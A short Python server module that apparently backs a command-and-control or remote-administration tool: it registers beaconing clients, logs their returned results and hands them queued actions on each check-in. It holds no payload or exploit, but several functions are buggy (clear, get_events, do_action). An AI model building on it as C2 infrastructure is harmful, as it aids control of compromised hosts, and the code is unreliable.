# coding:utf-8
import asyncio
from app.utils import *
from threading import Timer
import time
from json import dumps

Conn = {"test":{"uuid":"test","ip":"192.168.0.1","info":{"remarks":"test"}}}
Events = {"global":[],"test":["this is test"]}
Do = {}

def get_conn(uuid):
    return Conn[uuid]

def get_list(length=0):
    if length == 0 or length>=len(Conn):
        return Conn
    else:
        # todo: 整个分页
        return Conn

def add_events(uuid,data):
    if uuid not in Events:
        return False
    else:
        Events[uuid].append(data)
        return True


def get_events(uuid,length=20):
    if uuid not  in Events:
        return []
    if len(Events[uuid]) < length:
        return Events[uuid]
    else:
        return Events[uuid][:-length]


def do_action(uuid, do_something):
    if uuid not in Conn and uuid not in Do:
        return False
    Do[uuid].append(do_something)
    return True

def clear(time=60000):
    for i in Conn:
        if int(round(time.time() * 1000)) - i["sleep"] > time:
            offline(i["uuid"])


def offline(uuid):
    if uuid in Conn:
        Conn.pop(uuid)
        Events.pop(uuid)
        Do.pop(uuid)


def handle(packet,ip):
    data = loads(packet)
    if "uuid" not in data:
        return "", 404
    else:
        print("[!][BackEnd]Online:{}".format(ip))
        add_events("global","[+]%s:Online IP:%s" % (time.asctime(time.localtime(time.time())),ip)  )

        Conn[data["uuid"]] = {
        "ip":ip,
        "uuid":data["uuid"],
        "sleep":data["sleep"],
        "heartbeat":int(round(time.time() * 1000)),
        "info":data["info"],
        }
        if data["uuid"] not in Events:
            Events[data["uuid"]] = []
        else:
            for i in data["result"]:
                event = "Client %s>>>\n%s\nClient End <<<\n\n" %(time.asctime(time.localtime(time.time())),i)
                add_events(data["uuid"],event)

        if data["uuid"] not in Do:
            Do[data["uuid"]] = []
    ret = dumps(Do[data["uuid"]])

    Do[data["uuid"]] = []
    return ret
